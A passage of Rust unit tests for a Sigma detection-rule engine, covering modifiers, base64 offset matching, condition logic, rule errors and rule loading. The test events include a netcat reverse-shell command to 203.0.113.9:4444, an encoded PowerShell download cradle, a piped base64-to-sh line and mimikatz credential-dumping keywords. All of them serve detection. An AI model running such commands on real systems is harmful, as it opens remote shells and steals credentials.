        let number = rule("  sel:\n    ProcessId: 4\n  condition: sel");
        assert!(number.matches(&event(&[("ProcessId", "4")])));
        assert!(!number.matches(&event(&[("ProcessId", "44")])));

        let low_pid = rule("  sel:\n    ProcessId|lt: 100\n  condition: sel");
        assert!(low_pid.matches(&event(&[("ProcessId", "42")])));
        assert!(!low_pid.matches(&event(&[("ProcessId", "100")])));
        assert!(!low_pid.matches(&event(&[("ProcessId", "n/a")])));

        let same = rule("  sel:\n    Image|fieldref: ParentImage\n  condition: sel");
        assert!(same.matches(&event(&[("Image", "/bin/sh"), ("ParentImage", "/bin/SH")])));
        assert!(!same.matches(&event(&[
            ("Image", "/bin/sh"),
            ("ParentImage", "/bin/bash")
        ])));
    }

    #[test]
    fn encoded_values_are_found_at_any_offset() {
        // "IEX" as UTF-16LE inside a base64 command, at the three alignments.
        let offset_rule =
            rule("  sel:\n    CommandLine|wide|base64offset|contains: 'IEX'\n  condition: sel");
        use base64::Engine;
        for prefix in ["", "a", "ab"] {
            let text = format!("{prefix}IEX (New-Object Net.WebClient)");
            let wide: Vec<u8> = text.encode_utf16().flat_map(u16::to_le_bytes).collect();
            let encoded = base64::engine::general_purpose::STANDARD.encode(wide);
            let command = format!("powershell -enc {encoded}");
            assert!(
                offset_rule.matches(&event(&[("CommandLine", &command)])),
                "prefix {prefix:?}"
            );
        }
        let innocent = base64::engine::general_purpose::STANDARD.encode(
            "Get-Date"
                .encode_utf16()
                .flat_map(u16::to_le_bytes)
                .collect::<Vec<u8>>(),
        );
        assert!(!offset_rule.matches(&event(&[(
            "CommandLine",
            &format!("powershell -enc {innocent}")
        )])));

        let plain = rule("  sel:\n    CommandLine|base64|contains: 'whoami'\n  condition: sel");
        assert!(plain.matches(&event(&[("CommandLine", "echo d2hvYW1p | base64 -d | sh")])));
    }

    #[test]
    fn keywords_and_lists_of_maps() {
        let keywords =
            rule("  keywords:\n    - 'mimikatz'\n    - 'sekurlsa::*'\n  condition: keywords");
        assert!(keywords.matches(&event(&[("CommandLine", "x.exe SEKURLSA::logonpasswords")])));
        assert!(keywords.matches(&event(&[("Image", "C:\\tools\\Mimikatz.exe")])));
        assert!(!keywords.matches(&event(&[("CommandLine", "notepad.exe")])));

        let alternatives = rule(
            "  sel:\n    - Image|endswith: '/nc'\n      CommandLine|contains: ' -e '\n    - Image|endswith: '/socat'\n  condition: sel",
        );
        assert!(alternatives.matches(&event(&[("Image", "/usr/bin/socat")])));
        assert!(alternatives.matches(&event(&[
            ("Image", "/bin/nc"),
            ("CommandLine", "nc -e /bin/sh")
        ])));
        assert!(
            !alternatives.matches(&event(&[("Image", "/bin/nc"), ("CommandLine", "nc -l 80")]))
        );
    }

    #[test]
    fn conditions_follow_precedence_and_quantifiers() {
        let searches = "  a:\n    Image: 'a'\n  b:\n    User: 'b'\n  c:\n    CommandLine: 'c'\n";
        let matches = |condition: &str, fields: &[(&str, &str)]| {
            rule(&format!("{searches}  condition: {condition}")).matches(&event(fields))
        };
        let a = [("Image", "a")];
        let ab = [("Image", "a"), ("User", "b")];
        let abc = [("Image", "a"), ("User", "b"), ("CommandLine", "c")];
        let none = [("Image", "z")];

        // `and` binds tighter than `or`; `not` tighter than both.
        assert!(matches("a or b and c", &a));
        assert!(!matches("(a or b) and c", &a));
        assert!(matches("a and not c", &ab));
        assert!(!matches("not a and b", &ab));
        assert!(matches("not (a and c)", &ab));

        assert!(matches("1 of them", &a));
        assert!(!matches("1 of them", &none));
        assert!(!matches("all of them", &ab));
        assert!(matches("all of them", &abc));
        assert!(matches("2 of them", &ab));
        assert!(!matches("2 of them", &a));
        assert!(matches("any of them", &a));
        assert!(
            matches("ALL OF them AND NOT 1 OF z*", &abc),
            "keywords in any case"
        );
        // A pattern naming no search selects nothing.
        assert!(!matches("1 of z*", &abc));
        assert!(!matches("all of z*", &abc));

        // A list of conditions is a disjunction.
        let listed = rule(&format!("{searches}  condition:\n    - a and c\n    - b"));
        assert!(listed.matches(&event(&ab)));
        assert!(!listed.matches(&event(&a)));
    }

    #[test]
    fn unsupported_or_broken_rules_are_refused_with_the_reason() {
        let sel = "  sel:\n    Image: 'a'\n";
        assert!(refused(&format!("{sel}  condition: sel | count() > 5")).contains("aggregations"));
        assert!(refused(&format!("{sel}  timeframe: 5m\n  condition: sel")).contains("timeframe"));
        assert!(
            refused(&format!("{sel}  condition: sel and missing"))
                .contains("unknown search 'missing'")
        );
        assert!(refused(&format!("{sel}  condition: (sel")).contains("missing ')'"));
        assert!(refused(&format!("{sel}  condition: sel and")).contains("ends unexpectedly"));
        assert!(refused(&format!("{sel}  condition: sel sel")).contains("unexpected 'sel'"));
        assert!(refused(sel).contains("no condition"));
        assert!(
            refused("  sel:\n    SourceIp|cidr: '10.0.0.0/8'\n  condition: sel")
                .contains("modifier 'cidr' is not supported")
        );
        assert!(
            refused("  sel:\n    CommandLine|re: '('\n  condition: sel")
                .contains("invalid pattern")
        );
        assert!(
            refused("  sel:\n    User|exists: 'yes'\n  condition: sel").contains("true or false")
        );
        assert!(
            parse_rule("detection:\n  sel:\n    a: b\n  condition: sel")
                .unwrap_err()
                .contains("no title")
        );
        assert!(parse_rule("title: T").unwrap_err().contains("no detection"));
        assert!(
            parse_rule("title: [unclosed")
                .unwrap_err()
                .contains("invalid YAML")
        );
        assert!(
            parse_rule("title: A\n---\ntitle: B")
                .unwrap_err()
                .contains("collections")
        );
    }

    #[test]
    fn rules_for_another_log_source_or_system_are_not_applied() {
        let parse = |logsource: &str| {
            parse_rule(&format!(
                "title: T\nlogsource:\n{logsource}detection:\n  sel:\n    Image: a\n  condition: sel"
            ))
            .unwrap()
        };
        let generic = parse("  category: process_creation\n");
        assert_eq!(not_applicable(&generic, "linux"), None);
        let windows = parse("  category: process_creation\n  product: Windows\n");
        assert_eq!(not_applicable(&windows, "windows"), None);
        assert_eq!(
            not_applicable(&windows, "linux").as_deref(),
            Some("written for windows")
        );
        let network = parse("  category: network_connection\n");
        assert!(
            not_applicable(&network, "windows")
                .unwrap()
                .contains("network_connection")
        );
        let service = parse("  product: windows\n  service: security\n");
        assert!(
            not_applicable(&service, "windows")
                .unwrap()
                .contains("no log source category")
        );
    }

    fn process(pid: u32, ppid: Option<u32>, path: &str, cmdline: Option<&str>) -> ProcessInfo {
        ProcessInfo {
            pid,
            name: path.rsplit('/').next().unwrap_or(path).to_string(),
            path: Some(path.to_string()),
            cmdline: cmdline.map(str::to_string),
            ppid,
            user: Some("alice".to_string()),
        }
    }

    #[test]
    fn processes_are_presented_with_sigma_field_names() {
        let parent = process(100, Some(1), "/usr/sbin/sshd", Some("sshd: alice"));
        let child = process(
            200,
            Some(100),
            "/usr/bin/nc",
            Some("nc -e /bin/sh 203.0.113.9 4444"),
        );
        let event = process_event(&child, Some(&parent));
        assert_eq!(event["image"], "/usr/bin/nc");
        assert_eq!(event["commandline"], "nc -e /bin/sh 203.0.113.9 4444");
        assert_eq!(event["processid"], "200");
        assert_eq!(event["parentprocessid"], "100");
        assert_eq!(event["parentimage"], "/usr/sbin/sshd");
        assert_eq!(event["parentcommandline"], "sshd: alice");
        assert_eq!(event["user"], "alice");

        let rule = rule(
            "  sel:\n    Image|endswith: '/nc'\n    CommandLine|contains: ' -e '\n    ParentImage|endswith: '/sshd'\n  condition: sel",
        );
        assert!(rule.matches(&event));
        assert!(
            !rule.matches(&process_event(&child, None)),
            "no parent known"
        );

        // Without a path or a command line, the name stands in.
        let bare = ProcessInfo {
            pid: 5,
            name: "/sbin/launchd".to_string(),
            path: None,
            cmdline: None,
            ppid: None,
            user: None,
        };
        let event = process_event(&bare, None);
        assert_eq!(event["image"], "/sbin/launchd");
        assert_eq!(event["commandline"], "/sbin/launchd");
        assert!(!event.contains_key("user") && !event.contains_key("parentprocessid"));
    }

    #[test]
    fn directory_loading_keeps_applicable_rules_and_reports_the_rest() {
        let dir = tempfile::tempdir().unwrap();
        let nested = dir.path().join("rules").join("linux");
        std::fs::create_dir_all(&nested).unwrap();
        let write = |path: &Path, logsource: &str| {
            std::fs::write(
                path,
                format!(
                    "title: {}\nlogsource:\n{logsource}detection:\n  sel:\n    Image|endswith: '/nc'\n  condition: sel\n",
                    path.file_stem().unwrap().to_string_lossy()
                ),
            )
            .unwrap();
        };
        write(
            &nested.join("generic.yml"),
            "  category: process_creation\n",
        );
        write(
            &nested.join("host.yaml"),
            &format!(
                "  category: process_creation\n  product: {}\n",
                host_product()
            ),
        );
        write(
            &nested.join("other_os.yml"),
            "  category: process_creation\n  product: plan9\n",
        );
        write(&dir.path().join("dns.yml"), "  category: dns_query\n");
        std::fs::write(dir.path().join("broken.yml"), "title: [").unwrap();
        std::fs::write(dir.path().join("notes.txt"), "not a rule").unwrap();

        let (engine, report) = SigmaEngine::load_dir(dir.path());
        assert_eq!(engine.rule_count(), 2);
        assert_eq!(report.loaded, 2);
        assert_eq!(report.not_applicable, 2);
        assert_eq!(report.errors.len(), 1, "{:?}", report.errors);
        assert!(
            report.errors[0].contains("broken.yml") && report.errors[0].contains("invalid YAML")
        );

        let hits = engine.evaluate(&event(&[("Image", "/usr/bin/nc")]));
        let mut titles: Vec<&str> = hits.iter().map(|rule| rule.title.as_str()).collect();
        titles.sort_unstable();
        assert_eq!(titles, ["generic", "host"]);
        assert!(
            engine
                .evaluate(&event(&[("Image", "/usr/bin/ls")]))
                .is_empty()
        );

        let (empty, report) = SigmaEngine::load_dir(&dir.path().join("absent"));
        assert_eq!(empty.rule_count(), 0);
        assert!(report.errors.is_empty());
    }
}
